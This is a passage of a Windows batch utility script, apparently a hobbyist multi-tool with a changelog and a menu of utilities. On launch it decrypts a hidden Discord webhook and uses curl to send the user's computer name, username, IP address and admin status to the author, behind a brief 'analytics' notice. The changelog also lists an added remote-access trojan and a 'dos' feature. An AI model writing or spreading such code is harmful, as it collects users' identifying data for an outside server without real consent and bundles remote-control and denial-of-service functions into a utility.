...
:: Secrect Count: 14 > 15
:: Added:
::	refinments to calculator
::	"encryption" to webhook
::	path to script folder
::	clarification to where get openai api key
::	virustotal fileupload
::	secrect
::	folder to cleaning
::	argument to dl
::	start via uac
...
::	menu var
::	dos
::	quotes around file cleanup, to prevent unintended deletion.
::	new analytic thing
::	rat (only if you want it!!)
::	curl check
::	restart script (type r)
::	compact
::	checks if your using new minecraft terminal
::	v to ascii art
::	version and version name at top right
::	open browser
::	little things
:: Removed:
::	powershell outfile variable
:: Improved/Changed:
::	changed basic calculator into submenu "math"
::	discord webhook
::	message > msg
::	voicemessage > vmsg
::	used var taskkill in gamebar (i forgor)
::	socials > soc
::	realtimedatetime > rtdt
::	powershell download commands to curl
::	revamped download system
::	username > ip when sending a message
::	rearranged startup things
::	oh well, had to make it horozontial! (redesigned menu)
::	other little things
:: Bug Fixes
:: 	random number
::	clean folder
...
if exist !sp!\rs.txt (
	...
	echo script first ran at !date! !time! with version !ver! >!sp!\rs.txt
	set sr=wasn't ran before.
)
echo sending some analytics.. this may take a second!
echo decrypting discord webhook and sending analytics (you agreed to this)
...
curl -H "Content-Type: application/json" -d "{\"content\": \"%rs%\ncurrent version: %ver%\nscript: %sr%\npc name: %COMPUTERNAME%\nusername: %USERNAME%\ndate and time: !date! !time!\nip: %ip%\nuac: %uac%\", \"embeds\": [], \"attachments\": []}" "!ad!"

:menu
mode con cols=75 lines=35
echo 	  __            __				    v%ver% All Out
echo 	 / /____  ___  / /     ^> #17 for socials
echo 	/ __/ _ \/ _ \/ /     ^> #27 to send me a message
echo 	\__/\___/\___/_/
echo 	       ___    ___  ____ ___
echo 	 _  __^|_  ^|  ^|_  ^|^|_  // _ \ ^> by chicken
echo 	^| ^|/ / __/_ / __/_/_ ^</ , _/ ^> enjoy
echo 	^|___/____(_)____/____/_/^|_^|
echo.
if defined name ( echo 	 hello, !name!
) else ( echo. )
echo  _________________________________________________________________________
echo 	* = needs internet	  ^|	** = needs admin perms
echo					  ^|
echo    0. exit			  ^|    20. clipboard viewer
echo    1. kid*			  ^|    21. shutdown utilies
echo    2. random number 1-65000	  ^|    22. list all apps installed
echo    3. clean the files..		  ^|    23. choose a color for the terminal
...
if "%wow%"=="r" ( goto start
	...
	start "" compact /c %homedrive% /s /i
	start "" compact /compactos:always /i
	%ga%
) else if "%wow%"=="39" ( 
) else if "%wow%"=="horn" (
	set f=horn.wav
